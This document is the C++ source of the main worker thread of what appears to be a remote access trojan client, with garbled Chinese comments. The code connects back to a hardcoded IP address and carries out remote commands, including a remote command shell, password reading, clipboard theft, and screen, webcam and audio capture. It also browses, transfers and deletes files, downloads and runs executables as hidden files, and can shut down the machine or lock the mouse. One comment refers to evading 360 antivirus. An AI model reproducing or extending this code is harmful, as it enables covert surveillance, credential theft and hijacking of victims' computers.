#include "StdAfx.h"
#include "WorkThreadMain.h"
#include "Resource.h"
#include <afxinet.h>

using namespace std;

static bool m_bStop = false;  //�Ƿ�ر�����

CWorkThreadMain::CWorkThreadMain(void)
{
}

CWorkThreadMain::~CWorkThreadMain(void)
{
}

void CWorkThreadMain::GetSysInfo()
{
	m_moduleSocket.m_nPort = 9527;
	this->m_nTime = 10;
	strcpy_s(this->m_szIpAddr, "218.197.48.28");  //��������IP��ַ
}

SOCKET CWorkThreadMain::Run()
{
	SOCKET socket = INVALID_SOCKET;
	while (true)
	{
		bool bSuccess = true;
		UINT32 result = m_moduleSocket.ConnectServer((char*)m_szIpAddr, &socket, &bSuccess);
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				break;
			}
		}
		else
		{
			Sleep(this->m_nTime * 1000);
			cout << "Sleep" << endl;
		}
	}
	return socket;   //����socket
}

void CWorkThreadMain::ShakeHandCheck(IN const SOCKET Sock, OUT bool* pbSuccess)
{
	MSGINFO_S msg;
	m_socket = Sock;
	while (true)
	{
		if (this->m_bRunFlag == false)
		{
			break;
		}
		memset(&msg, 0, sizeof(MSGINFO_S));
		bool bSuccess = true;
		UINT32 result = m_moduleSocket.RecvCommand(m_socket,(char*)&msg,sizeof(MSGINFO_S), &bSuccess);
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				const char *pSignal = "BlackYe";
				if (CMD_SHAKEHAND == msg.Msg_id && (0 == strcmp(pSignal, (char*)msg.context)))
				{
					memset(&msg, 0 , sizeof(MSGINFO_S));
					msg.Msg_id = CMD_SYSINFO;  //����ϵͳ��Ϣ
					printf("Control_CMD: GetSystemInfo\n");
					m_sysInfo.SendSysInfo(Sock, &bSuccess);
					break;
				}
			}
		}
	}
}

void CWorkThreadMain::ExecCommand(IN const SOCKET l_Socket)
{
	bool bSuccess = true;
	MSGINFO_S msg;

	while (true)
	{
		if (this->m_bRunFlag == false)
		{
			break;
		}
		memset(&msg, 0, sizeof(MSGINFO_S));
		bool bSuccess = true;
		UINT32 result = m_moduleSocket.RecvCommand(m_socket,(char*)&msg,sizeof(MSGINFO_S), &bSuccess);
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				switch (msg.Msg_id)
				{
				case CMD_DISKINFO:   //��ȡ������Ϣ
					{
						printf("Control_CMD: GET Disk Info\n");
						m_diskInfo.SendDiskInfo(l_Socket);  //���ʹ�����Ϣ
					}
					break;
				case CMD_FILELIST:   //�ļ��б�
					{
						printf("Control_CMD: GET File List Info\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)&msg.context, sizeof(szPath));
						m_diskInfo.SendFileList(szPath, l_Socket);
					}
					break;
				case CMD_DOWNLOAD:  //�ļ�����
					{
						printf("Control_CMD: DownLoad File Info\n");
						TEMPSTRUCT tagTemp;
						memset(&tagTemp, 0, sizeof(TEMPSTRUCT));
						memcpy((char*)tagTemp.context, (char*)msg.context, sizeof(tagTemp.context));
						tagTemp.l_Socket = l_Socket;
						tagTemp.cFileInfo = (DWORD)&m_fileInfo;
						::CloseHandle(CreateThread(NULL, 0, ToDownFileProc, (LPVOID)&tagTemp, 0, NULL));
					}
					break;
				case CMD_UPLOAD:  //�ļ��ϴ�(�������ļ�)
					{
						printf("Control_CMD: UpLoad File !\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)msg.context, sizeof(szPath));
						m_fileInfo.CreateUpLoadFile(szPath);
					}
					break;
				case CMD_FILEUPLOAD:  //�ļ����ݿ��ϴ�
					{
						printf("Control_CMD: File Data UpLoad !\n");
						DOWNFILEDATA_S tagDownFileDate;
						memset(&tagDownFileDate, 0, sizeof(DOWNFILEDATA_S));
						memcpy((char*)&tagDownFileDate, (char*)msg.context, sizeof(DOWNFILEDATA_S));
						m_fileInfo.WriteDataInFile(tagDownFileDate);
					}
					break;
				case CMD_FILEEXEC:   //�ļ���ִ�е�����
					{
						printf("Control_CMD: File Execute !\n");
						wchar_t szFilePath[MAX_PATH] = {0};
						memcpy(szFilePath, (char*)msg.context, sizeof(szFilePath));
						m_fileInfo.ExecuteFile(szFilePath, l_Socket);
					}
					break;
				case CMD_REFRESH:   //ˢ�²���(ͬ�ļ��б�)
					{
						printf("Control_CMD: Refresh !\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)msg.context, sizeof(szPath));
						m_diskInfo.SendFileList(szPath, l_Socket);
					}
					break;
				case CMD_FOLDER_CREATE:  //����Ŀ¼
					{
						printf("Control_CMD: Create Directory !\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)msg.context, sizeof(szPath));
						m_diskInfo.ExecCreateFolder(szPath, l_Socket);
					}
					break;
				case CMD_FILE_DEL:   //�ļ�(��)ɾ��
					{
						printf("Control_CMD: File(Folder) Delete !\n");
						FILEDELSTRUCT_S tagFileDel;
						memset(&tagFileDel, 0, sizeof(FILEDELSTRUCT_S));
						memcpy((char*)&tagFileDel.tagFileInfo, (char*)msg.context, sizeof(tagFileDel.tagFileInfo));
						tagFileDel.l_Socket = l_Socket;
						tagFileDel.cDiskInfo = (DWORD)&m_diskInfo;
						::CloseHandle(CreateThread(NULL, 0, DeleteTargetFileProc, (LPVOID)&tagFileDel, 0, NULL));
					}
					break;
				case CMD_FILE_COPY:  //�ļ�����
					{
						printf("Control_CMD: File Copy !\n");
						FILECOPY_S tagFileInfo;
						memset(&tagFileInfo, 0, sizeof(FILECOPY_S));
						memcpy((char*)&tagFileInfo, (char*)msg.context, sizeof(FILECOPY_S));
						m_diskInfo.AddCopyFileIntoList(tagFileInfo);
					}
					break;
				case CMD_FILE_PASTE:  //�ļ�ճ��
					{
						printf("Control_CMD: File Paste !\n");
						wchar_t szFilePath[MAX_PATH] = {0};
						memcpy((char*)szFilePath, (char*)msg.context, sizeof(szFilePath));
						m_diskInfo.ExecuteCopyFile(szFilePath, l_Socket);
					}
					break;
				case CMD_FILE_RENAME:  //������
					{
						printf("Control_CMD: File Rename !\n");
						FILECOPY_S tagFileInfo;
						memset(&tagFileInfo, 0, sizeof(FILECOPY_S));
						memcpy((char*)&tagFileInfo, (char*)msg.context, sizeof(FILECOPY_S));
						m_diskInfo.FileReName(tagFileInfo, l_Socket);
					}
					break;
				case CMD_ATTRIBUTE:  //����
					{
						printf("Control_CMD: Attribute !\n");
						ATTRIBUTE_S tagAttribute;
						memset(&tagAttribute, 0, sizeof(ATTRIBUTE_S));
						memcpy((char*)&tagAttribute, (char*)msg.context, sizeof(ATTRIBUTE_S));
						m_fileInfo.SendAttriInfo(tagAttribute, l_Socket);
					}
					break;
				case CMD_TELNET:  //Զ��CMDShell��������
					{
						printf("Control_CMD: CMD connect !\n");
						m_cmdShell.SetCmdSocket(l_Socket);
						::CloseHandle(CreateThread(NULL, 0, SenCmdProc, (LPVOID)&m_cmdShell, 0, NULL));
						Sleep(200);
						::CloseHandle(CreateThread(NULL, 0, InitCmdProc, (LPVOID)&m_cmdShell, 0, NULL));
					}
					break;
				case CMD_COMMOND:  //����CMDִ������
					{
						printf("Control_CMD: Recv CMDShell Commond !\n");
						COMMOND_S tagCmdInfo;
						char szRecvBuf[1024] = {0};
						memset(&tagCmdInfo, 0, sizeof(COMMOND_S));
						memcpy((char*)&tagCmdInfo, (char*)msg.context, sizeof(COMMOND_S));
						strcpy_s(szRecvBuf, sizeof(szRecvBuf), tagCmdInfo.command);
						m_cmdShell.Cmd_Recv(szRecvBuf);
					}
					break;
				case CMD_CHATMSG:   //������ʹ��Ϣ
					{
						printf("Control_CMD: Recv Chat Msg!\n");
						CHATMSG_S tagChatMsg;
						memset(&tagChatMsg, 0, sizeof(CHATMSG_S));
						memcpy((char*)&tagChatMsg, (char*)msg.context, sizeof(CHATMSG_S));
						if (tagChatMsg.bfirstSend)  //����ǵ�һ�η�����Ϣ���򴴽�һ�����̿�������
						{
							m_ChatMsgDlg.SetSendSocket(l_Socket);
							CreateThread(NULL, 0, InitChatMsgDlgProc, (LPVOID)&m_ChatMsgDlg, 0, NULL); //�����Ի��� 
							Sleep(200);
						}
						if (NULL != m_ChatMsgDlg.GetSafeHwnd())
						{
							m_ChatMsgDlg.RecvChatMsg(tagChatMsg);
						}
					}
					break;
				case CMD_PROGRESS:  //�鿴���н�����Ϣ
					{
						printf("Control_CMD: View Progress Information!\n");
						m_TaskManager.SendProgressList(l_Socket, 0);
					}
					break;
				case CMD_PROC_TASKKILL:   //�رս���
					{
						printf("Control_CMD: Taskkill Progress!\n");
						PROGRESS_S tagProInfo;
						memset(&tagProInfo, 0, sizeof(PROGRESS_S));
						memcpy((char*)&tagProInfo, (char*)msg.context, sizeof(PROGRESS_S));
						m_TaskManager.TaskkillProc(tagProInfo, l_Socket);
					}
					break;
				case CMD_GETPWD:  //��ȡ�ʺ�����
					{
						printf("Control_CMD: ReadPsw!\n");
						m_readPsw.SendSecurityPwd(l_Socket);
					}
					break;
				case CMD_SCREEN:  //��Ļ����
					{
						printf("Control_CMD: Recv Screen!\n");
						m_Screen.m_socket = l_Socket;  //Socketֵ
						CStringA strMsg = "";
						strMsg.Format("%s", msg.context);
						if ("open" == strMsg)  //����
						{
							m_Screen.m_bFlag = true;
							 m_Screen.m_hThread = CreateThread(NULL, 0, SendScreeProc, (LPVOID)&m_Screen, 0, NULL);
						}
						else
						{
							m_Screen.m_bFlag = false;
							::CloseHandle(m_Screen.m_hThread);
						}
					}
					break;
				case CMD_VIDEO_VIEW:  //����ͷ
					{
						printf("Control_CMD: View Video !\n");
						CStringA strMsg = "";
						strMsg.Format("%s", msg.context);
						if ("open" == strMsg)  //����
						{
							VIDEOTEMP_S tagVideoTemp;
							memset(&tagVideoTemp, 0, sizeof(VIDEOTEMP_S));
							tagVideoTemp.l_Socket = l_Socket;
							tagVideoTemp.cThis = (DWORD)this;
							m_bStop = false;
							m_hThread = CreateThread(NULL, 0, SendVideoProc, (LPVOID)&tagVideoTemp, 0, NULL);
						}
						else
						{
							m_bStop = true;
 							::CloseHandle(m_hThread);  //�ر��߳̾��
						}
					}
					break;
				case CMD_OPERATOR:   //�ػ�/ע��/����
					{
						OPERATOR_S tagOperator;
						memset(&tagOperator, 0, sizeof(OPERATOR_S));
						memcpy((char*)&tagOperator, (char*)msg.context, sizeof(OPERATOR_S));
						switch (tagOperator.nType)
						{
						case 0:  //�ػ�
							ExecShutdown();
							break;
						case 1:  //ע��
							ExecLogoff();
							break;
						case 2:  //����
							ExecRestart();
							break;
						default: //δ֪
							break;
						}
					}
					break;
				case CMD_AUDIO:  //��������
					{
						CStringA strMsg = "";
						strMsg.Format("%s", msg.context);
						if ("open" == strMsg)  //����
						{
							m_AudioManager.m_socket = l_Socket;
							if (m_AudioManager.Initialize())
							{
								m_AudioManager.SendRecordBuffer();
							}
						}
					}
					break;
				case CMD_BROADCAST:  //Զ������㲥
					{
						BROADCAST_S tagBroadCast;
						memset(&tagBroadCast, 0, sizeof(BROADCAST_S));
						memcpy((char*)&tagBroadCast, (char*)msg.context, sizeof(BROADCAST_S));
						if (tagBroadCast.bTag)
						{
							BROADTEMP_S tagBroadTemp;
							memset(&tagBroadTemp, 0, sizeof(BROADTEMP_S));
							tagBroadTemp.cWorkMain = (DWORD)this;
							tagBroadTemp.pTagBroadCast = &tagBroadCast;
							::CloseHandle(CreateThread(NULL, 0, DealBroadCastProc, (LPVOID)&tagBroadTemp, 0, NULL));
						}
						else   //������ܵ��Ǵ�����Ϣ
						{
							::MessageBox(NULL, tagBroadCast.tagWndInfo.szContent, tagBroadCast.tagWndInfo.szTitle, tagBroadCast.tagWndInfo.nType);
	                    }
					}
					break;
				case CMD_DESKTOP:   //�������
					{
						DESKTOPINFO_S tagDesktopInfo;
						memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_S));
						memcpy((char*)&tagDesktopInfo, (char*)msg.context, sizeof(DESKTOPINFO_S));
						if (CLIPBOARD == tagDesktopInfo.nType)  //������ܵ����Ƿ��ͼ����������
						{
							::CloseHandle(CreateThread(NULL, 0, SendClipBoardProc, (LPVOID)this, 0, NULL));
						}
						else
						{
							DealDesktopInfo(tagDesktopInfo);
						}
					}
					break;
				default:
					{
						printf("Control_CMD: UnKnow Command\n");
						break;
					}
				}
			}
		}
		else
		{
			break;
		}
	}
}

DWORD WINAPI CWorkThreadMain::ToDownFileProc( LPVOID lpParamter )
{
	TEMPSTRUCT* pTagTemp = (TEMPSTRUCT*)lpParamter;
	if (NULL != pTagTemp)
	{
		wchar_t szDownLoadPath[MAX_PATH] = {0};
		memcpy(szDownLoadPath, (char*)pTagTemp->context, sizeof(szDownLoadPath));
		CFileInfo* pFileInfo = (CFileInfo*)pTagTemp->cFileInfo;
		pFileInfo->SendDownFileInfo(szDownLoadPath, pTagTemp->l_Socket);
	}
	return 0;
}

//ɾ���ļ����У�
DWORD WINAPI CWorkThreadMain::DeleteTargetFileProc( LPVOID lpParamter )
{
	FILEDELSTRUCT_S* pTagFileDel = (FILEDELSTRUCT_S*)lpParamter;
	if (NULL != pTagFileDel)
	{
		FILEINFO_S tagFileInfo;
		memset(&tagFileInfo, 0, sizeof(FILEINFO_S));
		memcpy(&tagFileInfo, (FILEINFO_S*)&pTagFileDel->tagFileInfo, sizeof(FILEINFO_S));
		CDisk* pDisk = (CDisk*)pTagFileDel->cDiskInfo;
		pDisk->DeleteTargetFile(tagFileInfo, pTagFileDel->l_Socket);  //ɾ���ļ���
	}
	return 0;
}

//����CMDִ�н��
DWORD WINAPI CWorkThreadMain::SenCmdProc(LPVOID lpParameter)
{
	CCmdShell* pCmdShell = (CCmdShell*)lpParameter;
	pCmdShell->Cmd_Send();
	return 0;
}

DWORD WINAPI CWorkThreadMain::InitCmdProc(LPVOID lpParameter)
{
	CCmdShell* pCmdShell = (CCmdShell*)lpParameter;
	pCmdShell->Cmd_Init();
	return 0;
}

//��Ϣ����
DWORD WINAPI CWorkThreadMain::InitChatMsgDlgProc(LPVOID lpParameter)
{
	CChatMsgDlg* pChatMsg = (CChatMsgDlg*)lpParameter;
	pChatMsg->DoModal();
	return 0;
}

//������Ļ��Ϣ
DWORD WINAPI CWorkThreadMain::SendScreeProc(LPVOID lpParameter)
{
	CScreen* m_pScreen = (CScreen*)lpParameter;
	if (NULL != m_pScreen)
	{
		m_pScreen->SendScreenData();
	}
	return 0;
}

DWORD WINAPI CWorkThreadMain::SendVideoProc(LPVOID lpParameter)
{
	VIDEOTEMP_S* tagVideoTemp = (VIDEOTEMP_S*)lpParameter;

	CViewVideo cViewVideo;  //����ͷ��
	cViewVideo.m_socket = tagVideoTemp->l_Socket;
	CWorkThreadMain* pthis = (CWorkThreadMain*)lpParameter;
	bool bInit = cViewVideo.VideoInit();
	if (!bInit)
	{
		return 1;
	}
	bool bStop = false;
	while (!bStop)  //ѭ��������������
	{
		cViewVideo.SendViedoHeaderInfo();  //����λͼͷ����
		cViewVideo.SendVideoData();        //��������
// 		cViewVideo.m_dwLastSend = GetTickCount();   //�����仰��360��ɱ
// 		if ((GetTickCount() - cViewVideo.m_dwLastSend) < 100)
// 		{
// 			Sleep(30);
// 		}
		GetLocalTime(&cViewVideo.m_dwLastSend);
		SYSTEMTIME sysCurTime;
        GetLocalTime(&sysCurTime);
		if (sysCurTime.wMilliseconds - cViewVideo.m_dwLastSend.wMilliseconds < 100)
		{
			Sleep(30);
		}
		delete[] cViewVideo.m_pDataCompress;
		cViewVideo.m_pDataCompress = NULL;
		bStop = m_bStop;
	}
	return 0;
}

void CWorkThreadMain::ExecShutdown()  //�ػ�
{
	ExecOperarotr(EWX_SHUTDOWN);
}

void CWorkThreadMain::ExecLogoff()  //ע��
{
	ExecOperarotr(EWX_LOGOFF);
}

void CWorkThreadMain::ExecRestart()  //����
{
	ExecOperarotr(EWX_REBOOT);
}

void CWorkThreadMain::ExecOperarotr(IN const UINT nCommond)
{
	//�򿪽�������
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), 
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("OpenProcessToken Error.\n");
	}

	//���LUID
	TOKEN_PRIVILEGES tkp; 
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 

	//��������Ȩ��
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 
	if (GetLastError() != ERROR_SUCCESS) 
	{
		printf("AdjustTokenPrivileges Error.\n"); 
	}

	//�ر�ϵͳ
	if (!ExitWindowsEx(nCommond, 0)) 
	{
		printf("Shutdown Error!\n");
	}	
}

//����Զ������㲥
DWORD WINAPI CWorkThreadMain::DealBroadCastProc(LPVOID lpParameter)
{
	BROADTEMP_S *pTagBroadTemp = (BROADTEMP_S*)lpParameter;
	BROADCAST_S* pBroadCast = (BROADCAST_S*)pTagBroadTemp->pTagBroadCast;
	CWorkThreadMain* pThis = (CWorkThreadMain*)pTagBroadTemp->cWorkMain;
	CString strRetMsg = _T("");  //ִ�н��

	if (pBroadCast->bTag)  //���ܵ���Internet����Ϣ
	{
		HINSTANCE hExecFileRet;  //�ļ�����ִ�н��
		HINSTANCE hExecWebRet;  //��ҳ��ִ�н��
		if (pBroadCast->tagInternet.bDownLoad)  //�������ļ���
		{
			bool bSuccess = true;
			CString strExePath = _T("");  //�ļ����ص�·��
			strRetMsg = pThis->DownloadFile(pBroadCast->tagInternet.szWebSite, strExePath, &bSuccess);  //�ļ�����
			if (bSuccess)  //���سɹ�
			{
				if (pBroadCast->tagInternet.bRunExe)  //��������
				{
					hExecFileRet = ShellExecute(NULL, _T("open"), strExePath, NULL, NULL, SW_SHOW);
					if ((DWORD)hExecFileRet > 32) //ִ�гɹ�
					{
						strRetMsg += _T(" �ļ�ִ�гɹ�!");
					}
					else
					{
						strRetMsg += _T(" �ļ�ִ��ʧ��!");
					}
				}
			}
		}
		else  //ֻ�Ǵ���ҳ
		{
			hExecWebRet = ShellExecute(NULL, _T("open"), pBroadCast->tagInternet.szWebSite, NULL, NULL,SW_SHOW);
			if ((DWORD)hExecWebRet > 32)
			{
				strRetMsg += _T("��ҳ�򿪳ɹ�!");
			}
			else
			{
				strRetMsg += _T("��ҳ��ʧ��!");
			}
		}
		wchar_t szRetMsg[512] = {0};
		MSGINFO_S tagMsgInfo;
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
		tagMsgInfo.Msg_id = CMD_BROADCAST;
		wsprintfW(szRetMsg, _T("%s"), strRetMsg);
		memcpy((char*)tagMsgInfo.context, (char*)szRetMsg, sizeof(szRetMsg));
		bool bSuccess = true;
		pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
	return 0;
}

CString CWorkThreadMain::DownloadFile(IN const CString strWebPath, OUT CString& strExePath, OUT bool* pbSuccess)
{
	bool bSuccess = true;
	strExePath.Empty();  //�ļ���·��
	CInternetSession netSession(NULL, 0);
	netSession.SetOption( INTERNET_OPTION_CONNECT_TIMEOUT, 5000);  //���ó�ʱʱ��
	netSession.SetOption( INTERNET_OPTION_CONNECT_RETRIES, 5);  //�������Դ���
	CStdioFile *fTargFile = NULL;
	char filebuf[512];
	memset(filebuf, 0, sizeof(filebuf));
	CString strErrorMsg = _T("");
	try
	{
		fTargFile = netSession.OpenURL(strWebPath, 1, INTERNET_FLAG_TRANSFER_BINARY |INTERNET_FLAG_RELOAD);
		int filesize = fTargFile->SeekToEnd();  //�ļ���С
		fTargFile->SeekToBegin();  //���ļ�ָ���ƶ���ͷ
		bool bExist = true;
        GetProgramPath(strExePath, &bExist);
		if (bExist)
		{
			strExePath += _T("\\");
			strExePath += fTargFile->GetFileName();
		}
		else
		{
			strErrorMsg = _T("�ļ�Ŀ¼������C����!");
			strExePath = _T("C:\\") + fTargFile->GetFileName();  //���û���ҵ�Program·�����򿽱���CĿ¼��
		}
		//����һ�����ص��ļ�
		HANDLE hFile = CreateFile(strExePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			bSuccess = false;
			strErrorMsg += _T(" ���������ļ�ʱ�����ȡʧ��!");
		}
		else
		{
			CFile fDestFile(hFile);
			int byteswrite;		// д���ļ����ֽ���
			int curTotalSize = 0;  //��ǰд����ֽ���
			while (byteswrite = fTargFile->Read(filebuf, 512))	// ��ȡ�ļ�
			{
				fDestFile.Write(filebuf, byteswrite);	// ��ʵ������д���ļ�
				curTotalSize += byteswrite;
				memset(filebuf, 0, sizeof(filebuf));
			}
			if (curTotalSize < filesize)
			{
				strErrorMsg += _T(" ���������ش���,���Ժ�����!");
			}
			// ������ɣ��ر��ļ�
			fTargFile->Close();
			fDestFile.Close();
			netSession.Close();  //�ر�Session�Ự
			CloseHandle(hFile);
		}
	}
	catch (CInternetException *IE)
	{
		CString strerror;
		TCHAR error[255];

		IE->GetErrorMessage(error, 255); // ��ȡ������Ϣ
		strerror = error;
		IE->Delete();					// ɾ���쳣�����Է�ֹй©
		bSuccess = false;
		strErrorMsg += _T(" Http�ļ����ش���!");
	}
	if (NULL != fTargFile)
	{
		delete fTargFile;
		fTargFile = NULL;
	}
	if (bSuccess)
	{
		strErrorMsg += _T(" �ļ����سɹ�!");
	}
	*pbSuccess = bSuccess;
	return strErrorMsg;
}

//��ȡwindows programPath·��
UINT32 CWorkThreadMain::GetProgramPath( OUT CString& strPath, OUT bool* bSuccess)
{
#ifndef REG_LENGTH
#define REG_LENGTH  512
//ע���·��
#define REG_SUBKEY  _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion")
//�ļ�����
#define REG_VALUE_NAME   _T("ProgramFilesDir")
#endif

	UINT32 result = ERROR_SUCCESS;
	if (NULL == bSuccess)
	{
		result = ERROR_INVALID_PARAMETER;
		return result;
	}
	bool bRegOpen = true;    //ע����Ƿ�ɹ���
	HKEY hKey;
	TCHAR SubKey[REG_LENGTH] = REG_SUBKEY;
	TCHAR path[MAX_PATH];
	DWORD len=MAX_PATH;
	DWORD attr=REG_SZ;      //����
	LONG lRet;
	try
	{
		if (ERROR_SUCCESS == (result = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey, NULL, KEY_QUERY_VALUE, &hKey)))//�򿪴���ע����Ӧ�ļ�ֵ
		{
			lRet = ::RegQueryValueEx(hKey, REG_VALUE_NAME, NULL, &attr, (LPBYTE)path, &len);
			if (result != lRet)  //������صĽ������ERROR_SUCCESS,���ҽ��ʧ��
			{
				result = lRet;
				bRegOpen = false;
				throw result;
			}
			else
			{
				strPath.Format(_T("%s"), path);
			}
		}
		else  //ע����ʧ��
		{
			bRegOpen = false;
			throw result;	
		}
	}
	catch (UINT32)
	{
	}
	*bSuccess = bRegOpen;
	return result;
}

void CWorkThreadMain::DealDesktopInfo(IN const DESKTOPINFO_S tagDesktopInfo)
{
	switch (tagDesktopInfo.nType)  //��������
	{
	case MOUSE_MOVE:   //���
		{
			if (tagDesktopInfo.bTag)  //��������ƶ�
			{
				//�ͷ��޶�
				ClipCursor(NULL);
			}
			else   //��ֹ����ƶ�
			{
				RECT rect; 
				rect.bottom=1; 
				rect.right=1; 
				rect.left=0; 
				rect.top=0;
				ClipCursor(&rect);
			}
		}
		break;
	case DESKTOP_ICON:  //����ͼ��
		{
			if (tagDesktopInfo.bTag)  //��������
			{
				HWND hDeskIcon=FindWindow(_T("Progman"),NULL);
				ShowWindow(hDeskIcon,SW_HIDE);
			}
			else   //��ʾ����
			{
				HWND hDeskIcon=FindWindow(_T("Progman"),NULL);
				ShowWindow(hDeskIcon,SW_SHOW);
			}
		}
		break;
	case TASKBAR:  //������
		{
			if (tagDesktopInfo.bTag)  //����������
			{
				HWND hTaskBar=FindWindow(_T("Shell_TrayWnd"),NULL);
				ShowWindow(hTaskBar,SW_HIDE);

			}
			else   //��ʾ������
			{
				HWND hTaskBar=FindWindow(_T("Shell_TrayWnd"),NULL);
				ShowWindow(hTaskBar,SW_SHOW);
			}
		}
		break;
	default:   //δ֪
		break;
	}
}

DWORD WINAPI CWorkThreadMain::SendClipBoardProc(LPVOID lpParameter)
{
	CWorkThreadMain* pThis = (CWorkThreadMain*)lpParameter;
	if (NULL != pThis)
	{
		char* pBuffer = NULL;   //�ַ�������
		HANDLE hData = NULL;
		//�򿪼�����
		if (::OpenClipboard(NULL))
		{
			hData = ::GetClipboardData(CF_TEXT);
			pBuffer = (char*)::GlobalLock(hData);
			GlobalUnlock(hData);
			CloseClipboard();
	
			const int nBufSize = CLIPBOARD_BUF_SIZE; //��������С
			int	dwBytes = strlen(pBuffer);  //�ֽڴ�С
			UINT nSendBytes = 0;
			if (NULL == pBuffer)
			{
				return 1;
			}
			char* pPacket = new char[dwBytes + 1];   //ע������ΪʲôҪ + 1 , �����ַ����Ľ�����ǵ�ԭ�� û��+1��������������
			memcpy(pPacket, pBuffer, dwBytes + 1);

			MSGINFO_S tagMsgInfo;
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			tagMsgInfo.Msg_id = CMD_DESKTOP;
			CLIPBOARD_S tagClipBoard;
			memset(&tagClipBoard, 0, sizeof(CLIPBOARD_S));
			tagClipBoard.Begin = 0;
			tagClipBoard.bRead = false;
			tagClipBoard.dwSize = dwBytes;  //���ݴ�С
			tagClipBoard.id = 0;
			memcpy((char*)tagMsgInfo.context, (char*)&tagClipBoard, sizeof(CLIPBOARD_S));  //�������ݿ�Ĵ�С
			bool bSuccess = true;
			pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);

			//��������
			int nCount = dwBytes / nBufSize + 1;  //���͵Ĵ���
			if (0 == dwBytes % nBufSize)
			{
				nCount = nCount - 1;
			}   
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			memset(&tagClipBoard, 0, sizeof(CLIPBOARD_S));
			tagClipBoard.bRead = false;
			tagClipBoard.id = 1;  //��������
			UINT nBegin = 0;
			for (int index = 0; index < nCount ; index++)  //ѭ������
			{
				memset(&tagClipBoard.Data, 0, nBufSize); //��ʼ������
				memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
				tagMsgInfo.Msg_id = CMD_DESKTOP;

				nBegin = index * nBufSize;  //ÿ�ο�ʼ�������ݵ�λ��
				tagClipBoard.Begin = nBegin;
				tagClipBoard.dwSize  = 0;

				if (index == nCount -1)  //���һ�η���
				{
					tagClipBoard.bRead = true;  //��ʱ���Բ���������
					tagClipBoard.dwSize = dwBytes;  //���ݵ��ܴ�С
					tagClipBoard.id = 2;
					for (UINT i = nBegin, k = 0; i < dwBytes; i++, k++)
					{
						tagClipBoard.Data[k] = pPacket[i];
					}
				}
				else   //������һ��һ�鷢������
				{
					for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
					{
						tagClipBoard.Data[k] = pPacket[i];
					}
				}
				memcpy((char*)tagMsgInfo.context, (char*)&tagClipBoard, sizeof(CLIPBOARD_S));
				pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
			}
			if (NULL != pPacket)
			{
				delete[] pPacket;
				pPacket = NULL;
			}
		}
	}
	return 0;
}